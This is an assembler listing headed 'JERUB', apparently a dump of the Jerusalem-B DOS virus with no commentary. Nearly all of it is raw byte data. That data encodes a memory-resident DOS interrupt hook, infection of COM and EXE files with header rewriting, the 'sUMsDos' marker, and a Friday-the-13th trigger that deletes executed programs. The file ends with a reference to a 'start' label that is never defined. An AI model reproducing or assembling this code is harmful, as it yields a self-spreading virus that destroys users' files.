

  
PAGE  59,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        JERUB				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   22-Mar-90					         ÛÛ
;ÛÛ      Passes:    5	       Analysis Flags on: H		         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
  
;--------------------------------------------------------------	seg_a  ----
  
seg_a		segment	para public
		assume cs:seg_a , ds:seg_a , ss:stack_seg_b
  
		db	16 dup (46h)
		db	0B4h, 4Ch, 0B0h, 0, 0CDh, 21h
		db	0D1h, 86h, 87h, 12h, 1Ch, 0
		db	0, 0, 0, 0
  
seg_a		ends
  
  
  
;--------------------------------------------------------- stack_seg_b  ---
  
stack_seg_b	segment	para stack
  
		db	0E9h, 92h, 0, 73h, 55h, 4Dh
		db	73h, 44h, 6Fh, 73h, 0, 1
		db	6Ah, 0Bh, 0, 0, 0, 16h
		db	2, 2Ch, 2, 70h, 0, 8Dh
		db	13h, 8Ch, 2, 0EBh, 4, 10h
		db	0Ah, 0FAh
		db	78h
		db	13 dup (0)
		db	0E8h, 6, 26h, 0F9h, 0Ah, 80h
		db	0, 0, 0, 80h, 0, 0F9h
		db	0Ah, 5Ch, 0, 0F9h, 0Ah, 6Ch
		db	0, 0F9h, 0Ah, 10h, 0, 0
		db	0, 0, 0, 1, 0, 6
		db	0F2h, 2, 1, 4Dh, 5Ah, 30h
		db	1, 5, 0, 0, 0, 20h
		db	0, 1, 0, 0FFh, 0FFh, 2
		db	0, 10h, 7, 84h, 19h, 0C5h
		db	0, 2, 0, 22h, 0, 0
		db	0, 4Ch, 0B0h, 0, 0CDh, 21h
		db	5, 0, 20h, 0, 76h, 14h
		db	0A0h, 4, 0, 2, 10h, 0
		db	20h, 2, 0, 0, 0DBh, 3Eh
		db	58h, 9Bh
		db	'COMMAND.COM'
		db	0, 0, 0, 0, 0, 0
		db	0FCh, 0B4h, 0E0h, 0CDh, 21h, 80h
		db	0FCh, 0E0h, 73h, 16h, 80h, 0FCh
		db	3, 72h, 11h, 0B4h, 0DDh, 0BFh
		db	0, 1, 0BEh, 10h, 7, 3
		db	0F7h, 2Eh, 8Bh, 8Dh, 11h, 0
		db	0CDh, 21h, 8Ch, 0C8h, 5, 10h
		db	0, 8Eh, 0D0h, 0BCh, 0, 7
		db	50h, 0B8h, 0C5h, 0, 50h, 0CBh
		db	0FCh, 6, 2Eh, 8Ch, 6, 31h
		db	0, 2Eh, 8Ch, 6, 39h, 0
		db	2Eh, 8Ch, 6, 3Dh, 0, 2Eh
		db	8Ch, 6, 41h, 0, 8Ch, 0C0h
		db	5, 10h, 0, 2Eh, 1, 6
		db	49h, 0, 2Eh, 1, 6, 45h
		db	0, 0B4h, 0E0h, 0CDh, 21h, 80h
		db	0FCh, 0E0h, 73h, 13h, 80h, 0FCh
		db	3, 7, 2Eh, 8Eh, 16h, 45h
		db	0, 2Eh, 8Bh, 26h, 43h, 0
		db	2Eh, 0FFh, 2Eh, 47h, 0, 33h
		db	0C0h, 8Eh, 0C0h, 26h, 0A1h, 0FCh
		db	3, 2Eh, 0A3h, 4Bh, 0, 26h
		db	0A0h, 0FEh, 3, 2Eh, 0A2h, 4Dh
		db	0, 26h, 0C7h, 6, 0FCh, 3
		db	0F3h, 0A5h, 26h, 0C6h, 6, 0FEh
		db	3, 0CBh, 58h, 5, 10h, 0
		db	8Eh, 0C0h, 0Eh, 1Fh, 0B9h, 10h
		db	7, 0D1h, 0E9h, 33h, 0F6h, 8Bh
		db	0FEh, 6, 0B8h, 42h, 1, 50h
		db	0EAh, 0FCh, 3, 0, 0, 8Ch
		db	0C8h, 8Eh, 0D0h, 0BCh, 0, 7
		db	33h, 0C0h, 8Eh, 0D8h, 2Eh, 0A1h
		db	4Bh, 0, 0A3h, 0FCh, 3, 2Eh
		db	0A0h, 4Dh, 0, 0A2h, 0FEh, 3
		db	8Bh, 0DCh, 0B1h, 4, 0D3h, 0EBh
		db	83h, 0C3h, 10h, 2Eh, 89h, 1Eh
		db	33h, 0, 0B4h, 4Ah, 2Eh, 8Eh
		db	6, 31h, 0, 0CDh, 21h, 0B8h
		db	21h, 35h, 0CDh, 21h, 2Eh, 89h
		db	1Eh, 17h, 0, 2Eh, 8Ch, 6
		db	19h, 0, 0Eh, 1Fh, 0BAh, 5Bh
		db	2, 0B8h, 21h, 25h, 0CDh, 21h
		db	8Eh, 6, 31h, 0, 26h, 8Eh
		db	6, 2Ch, 0, 33h, 0FFh, 0B9h
		db	0FFh, 7Fh, 32h, 0C0h, 0F2h, 0AEh
		db	26h, 38h, 5, 0E0h, 0F9h, 8Bh
		db	0D7h, 83h, 0C2h, 3, 0B8h, 0
		db	4Bh, 6, 1Fh, 0Eh, 7, 0BBh
		db	35h, 0, 1Eh, 6, 50h, 53h
		db	51h, 52h, 0B4h, 2Ah, 0CDh, 21h
		db	2Eh, 0C6h, 6, 0Eh, 0, 0
		db	81h, 0F9h, 0C3h, 7, 74h, 30h
		db	3Ch, 5, 75h, 0Dh, 80h, 0FAh
		db	0Dh, 75h, 8, 2Eh, 0FEh, 6
		db	0Eh, 0, 0EBh, 20h, 90h, 0B8h
		db	8, 35h, 0CDh, 21h, 2Eh, 89h
		db	1Eh, 13h, 0, 2Eh, 8Ch, 6
		db	15h, 0, 0Eh, 1Fh, 0C7h, 6
		db	1Fh, 0, 90h, 7Eh, 0B8h, 8
		db	25h, 0BAh, 1Eh, 2, 0CDh, 21h
		db	5Ah, 59h, 5Bh, 58h, 7, 1Fh
		db	9Ch, 2Eh, 0FFh, 1Eh, 17h, 0
		db	1Eh, 7, 0B4h, 49h, 0CDh, 21h
		db	0B4h, 4Dh, 0CDh, 21h, 0B4h, 31h
		db	0BAh, 0, 6, 0B1h, 4, 0D3h
		db	0EAh, 83h, 0C2h, 10h, 0CDh, 21h
		db	32h, 0C0h, 0CFh, 2Eh, 83h, 3Eh
		db	1Fh, 0, 2, 75h, 17h, 50h
		db	53h, 51h, 52h, 55h, 0B8h, 2
		db	6, 0B7h, 87h, 0B9h, 5, 5
		db	0BAh, 10h, 10h, 0CDh, 10h, 5Dh
		db	5Ah, 59h, 5Bh, 58h, 2Eh, 0FFh
		db	0Eh, 1Fh, 0, 75h, 12h, 2Eh
		db	0C7h, 6, 1Fh, 0, 1, 0
		db	50h, 51h, 56h, 0B9h, 1, 40h
		db	0F3h, 0ACh, 5Eh, 59h, 58h, 2Eh
		db	0FFh, 2Eh, 13h, 0, 9Ch, 80h
		db	0FCh, 0E0h, 75h, 5, 0B8h, 0
		db	3, 9Dh, 0CFh, 80h, 0FCh, 0DDh
		db	74h, 13h, 80h, 0FCh, 0DEh, 74h
		db	28h, 3Dh, 0, 4Bh, 75h, 3
		db	0E9h, 0B4h, 0, 9Dh, 2Eh, 0FFh
		db	2Eh, 17h, 0, 58h, 58h, 0B8h
		db	0, 1, 2Eh, 0A3h, 0Ah, 0
		db	58h, 2Eh, 0A3h, 0Ch, 0, 0F3h
		db	0A4h, 9Dh, 2Eh, 0A1h, 0Fh, 0
		db	2Eh, 0FFh, 2Eh, 0Ah, 0, 83h
		db	0C4h, 6, 9Dh, 8Ch, 0C8h, 8Eh
		db	0D0h, 0BCh, 10h, 7, 6, 6
		db	33h, 0FFh, 0Eh, 7, 0B9h, 10h
		db	0, 8Bh, 0F3h, 0BFh, 21h, 0
		db	0F3h, 0A4h, 8Ch, 0D8h, 8Eh, 0C0h
		db	2Eh, 0F7h, 26h, 7Ah, 0, 2Eh
		db	3, 6, 2Bh, 0, 83h, 0D2h
		db	0, 2Eh, 0F7h, 36h, 7Ah, 0
		db	8Eh, 0D8h, 8Bh, 0F2h, 8Bh, 0FAh
		db	8Ch, 0C5h, 2Eh, 8Bh, 1Eh, 2Fh
		db	0, 0Bh, 0DBh, 74h, 13h, 0B9h
		db	0, 80h, 0F3h, 0A5h, 5, 0
		db	10h, 81h, 0C5h, 0, 10h, 8Eh
		db	0D8h, 8Eh, 0C5h, 4Bh, 75h, 0EDh
		db	2Eh, 8Bh, 0Eh, 2Dh, 0, 0F3h
		db	0A4h, 58h, 50h, 5, 10h, 0
		db	2Eh, 1, 6, 29h, 0, 2Eh
		db	1, 6, 25h, 0, 2Eh, 0A1h
		db	21h, 0, 1Fh, 7, 2Eh, 8Eh
		db	16h, 29h, 0, 2Eh, 8Bh, 26h
		db	27h, 0, 2Eh, 0FFh, 2Eh, 23h
		db	0, 33h, 0C9h, 0B8h, 1, 43h
		db	0CDh, 21h, 0B4h, 41h, 0CDh, 21h
		db	0B8h, 0, 4Bh, 9Dh, 2Eh, 0FFh
		db	2Eh, 17h, 0, 2Eh, 80h, 3Eh
		db	0Eh, 0, 1, 74h, 0E4h, 2Eh
		db	0C7h, 6, 70h, 0, 0FFh, 0FFh
		db	2Eh, 0C7h, 6, 8Fh, 0, 0
		db	0, 2Eh, 89h, 16h, 80h, 0
		db	2Eh, 8Ch, 1Eh, 82h, 0, 50h
		db	53h, 51h, 52h, 56h, 57h, 1Eh
		db	6, 0FCh, 8Bh, 0FAh, 32h, 0D2h
		db	80h, 7Dh, 1, 3Ah, 75h, 5
		db	8Ah, 15h, 80h, 0E2h, 1Fh, 0B4h
		db	36h, 0CDh, 21h, 3Dh, 0FFh, 0FFh
		db	75h, 3, 0E9h, 77h, 2, 0F7h
		db	0E3h, 0F7h, 0E1h, 0Bh, 0D2h, 75h
		db	5, 3Dh, 10h, 7, 72h, 0F0h
		db	2Eh, 8Bh, 16h, 80h, 0, 1Eh
		db	7, 32h, 0C0h, 0B9h, 41h, 0
		db	0F2h, 0AEh, 2Eh, 8Bh, 36h, 80h
		db	0, 8Ah, 4, 0Ah, 0C0h, 74h
		db	0Eh, 3Ch, 61h, 72h, 7, 3Ch
		db	7Ah, 77h, 3, 80h, 2Ch, 20h
		db	46h, 0EBh, 0ECh, 0B9h, 0Bh, 0
		db	2Bh, 0F1h, 0BFh, 84h, 0, 0Eh
		db	7, 0B9h, 0Bh, 0, 0F3h, 0A6h
		db	75h, 3, 0E9h, 2Fh, 2, 0B8h
		db	0, 43h, 0CDh, 21h, 72h, 5
		db	2Eh, 89h, 0Eh, 72h, 0, 72h
		db	25h, 32h, 0C0h, 2Eh, 0A2h, 4Eh
		db	0, 1Eh, 7, 8Bh, 0FAh, 0B9h
		db	41h, 0, 0F2h, 0AEh, 80h, 7Dh
		db	0FEh, 4Dh, 74h, 0Bh, 80h, 7Dh
		db	0FEh, 6Dh, 74h, 5, 2Eh, 0FEh
		db	6, 4Eh, 0, 0B8h, 0, 3Dh
		db	0CDh, 21h, 72h, 5Ah, 2Eh, 0A3h
		db	70h, 0, 8Bh, 0D8h, 0B8h, 2
		db	42h, 0B9h, 0FFh, 0FFh, 0BAh, 0FBh
		db	0FFh, 0CDh, 21h, 72h, 0EBh, 5
		db	5, 0, 2Eh, 0A3h, 11h, 0
		db	0B9h, 5, 0, 0BAh, 6Bh, 0
		db	8Ch, 0C8h, 8Eh, 0D8h, 8Eh, 0C0h
		db	0B4h, 3Fh, 0CDh, 21h, 8Bh, 0FAh
		db	0BEh, 5, 0, 0F3h, 0A6h, 75h
		db	7, 0B4h, 3Eh, 0CDh, 21h, 0E9h
		db	0C0h, 1, 0B8h, 24h, 35h, 0CDh
		db	21h, 89h, 1Eh, 1Bh, 0, 8Ch
		db	6, 1Dh, 0, 0BAh, 1Bh, 2
		db	0B8h, 24h, 25h, 0CDh, 21h, 0C5h
		db	16h, 80h, 0, 33h, 0C9h, 0B8h
		db	1, 43h, 0CDh, 21h, 72h, 3Bh
		db	2Eh, 8Bh, 1Eh, 70h, 0, 0B4h
		db	3Eh, 0CDh, 21h, 2Eh, 0C7h, 6
		db	70h, 0, 0FFh, 0FFh, 0B8h, 2
		db	3Dh, 0CDh, 21h, 72h, 24h, 2Eh
		db	0A3h, 70h, 0, 8Ch, 0C8h, 8Eh
		db	0D8h, 8Eh, 0C0h, 8Bh, 1Eh, 70h
		db	0, 0B8h, 0, 57h, 0CDh, 21h
		db	89h, 16h, 74h, 0, 89h, 0Eh
		db	76h, 0, 0B8h, 0, 42h, 33h
		db	0C9h, 8Bh, 0D1h, 0CDh, 21h, 72h
		db	3Dh, 80h, 3Eh, 4Eh, 0, 0
		db	74h, 3, 0EBh, 57h, 90h, 0BBh
		db	0, 10h, 0B4h, 48h, 0CDh, 21h
		db	73h, 0Bh, 0B4h, 3Eh, 8Bh, 1Eh
		db	70h, 0, 0CDh, 21h, 0E9h, 43h
		db	1, 0FFh, 6, 8Fh, 0, 8Eh
		db	0C0h, 33h, 0F6h, 8Bh, 0FEh, 0B9h
		db	10h, 7, 0F3h, 0A4h, 8Bh, 0D7h
		db	8Bh, 0Eh, 11h, 0, 8Bh, 1Eh
		db	70h, 0, 6, 1Fh, 0B4h, 3Fh
		db	0CDh, 21h, 72h, 1Ch, 3, 0F9h
		db	33h, 0C9h, 8Bh, 0D1h, 0B8h, 0
		db	42h, 0CDh, 21h, 0BEh, 5, 0
		db	0B9h, 5, 0, 0F3h, 2Eh, 0A4h
		db	8Bh, 0CFh, 33h, 0D2h, 0B4h, 40h
		db	0CDh, 21h, 72h, 0Dh, 0E9h, 0BCh
		db	0, 0B9h, 1Ch, 0, 0BAh, 4Fh
		db	0, 0B4h, 3Fh, 0CDh, 21h, 72h
		db	4Ah, 0C7h, 6, 61h, 0, 84h
		db	19h, 0A1h, 5Dh, 0, 0A3h, 45h
		db	0, 0A1h, 5Fh, 0, 0A3h, 43h
		db	0, 0A1h, 63h, 0, 0A3h, 47h
		db	0, 0A1h, 65h, 0, 0A3h, 49h
		db	0, 0A1h, 53h, 0, 83h, 3Eh
		db	51h, 0, 0, 74h, 1, 48h
		db	0F7h, 26h, 78h, 0, 3, 6
		db	51h, 0, 83h, 0D2h, 0, 5
		db	0Fh, 0, 83h, 0D2h, 0, 25h
		db	0F0h, 0FFh, 0A3h, 7Ch, 0, 89h
		db	16h, 7Eh, 0, 5, 10h, 7
		db	83h, 0D2h, 0, 72h, 3Ah, 0F7h
		db	36h, 78h, 0, 0Bh, 0D2h, 74h
		db	1, 40h, 0A3h, 53h, 0, 89h
		db	16h, 51h, 0, 0A1h, 7Ch, 0
		db	8Bh, 16h, 7Eh, 0, 0F7h, 36h
		db	7Ah, 0, 2Bh, 6, 57h, 0
		db	0A3h, 65h, 0, 0C7h, 6, 63h
		db	0, 0C5h, 0, 0A3h, 5Dh, 0
		db	0C7h, 6, 5Fh, 0, 10h, 7
		db	33h, 0C9h, 8Bh, 0D1h, 0B8h, 0
		db	42h, 0CDh, 21h, 72h, 0Ah, 0B9h
		db	1Ch, 0, 0BAh, 4Fh, 0, 0B4h
		db	40h, 0CDh, 21h, 72h, 11h, 3Bh
		db	0C1h, 75h, 18h, 8Bh, 16h, 7Ch
		db	0, 8Bh, 0Eh, 7Eh, 0, 0B8h
		db	0, 42h, 0CDh, 21h, 72h, 9
		db	33h, 0D2h, 0B9h, 10h, 7, 0B4h
		db	40h, 0CDh, 21h, 2Eh, 83h, 3Eh
		db	8Fh, 0, 0, 74h, 4, 0B4h
		db	49h, 0CDh, 21h, 2Eh, 83h, 3Eh
		db	70h, 0, 0FFh, 74h, 31h, 2Eh
		db	8Bh, 1Eh, 70h, 0, 2Eh, 8Bh
		db	16h, 74h, 0, 2Eh, 8Bh, 0Eh
		db	76h, 0, 0B8h, 1, 57h, 0CDh
		db	21h, 0B4h, 3Eh, 0CDh, 21h, 2Eh
		db	0C5h, 16h, 80h, 0, 2Eh, 8Bh
		db	0Eh, 72h, 0, 0B8h, 1, 43h
		db	0CDh, 21h, 2Eh, 0C5h, 16h, 1Bh
		db	0, 0B8h, 24h, 25h, 0CDh, 21h
		db	7, 1Fh, 5Fh, 5Eh, 5Ah, 59h
		db	5Bh, 58h, 9Dh, 2Eh, 0FFh, 2Eh
		db	17h
		db	12 dup (0)
		db	5Ah, 0, 0, 96h, 94h
		db	11 dup (0)
		db	0CDh, 20h, 0, 0A0h, 0, 9Ah
		db	0F0h, 0FEh, 1Dh, 0F0h, 2Fh, 1
		db	10h, 0Ah, 3Ch, 1, 10h, 0Ah
		db	0EBh, 4, 10h, 0Ah, 10h
		db	0Ah
		db	20 dup (0FFh)
		db	0F5h, 0Ah, 0E6h, 0FFh, 6Ah, 0Bh
		db	14h, 0, 18h, 0, 6Ah, 0Bh
		db	0FFh, 0FFh, 0FFh, 0FFh
		db	20 dup (0)
		db	0CDh, 21h, 0CBh
		db	10 dup (0)
		db	11 dup (20h)
		db	0, 0, 0, 0, 0
		db	11 dup (20h)
		db	9 dup (0)
		db	0Dh
		db	126 dup (0)
  
stack_seg_b	ends
  
  
  
		end	start

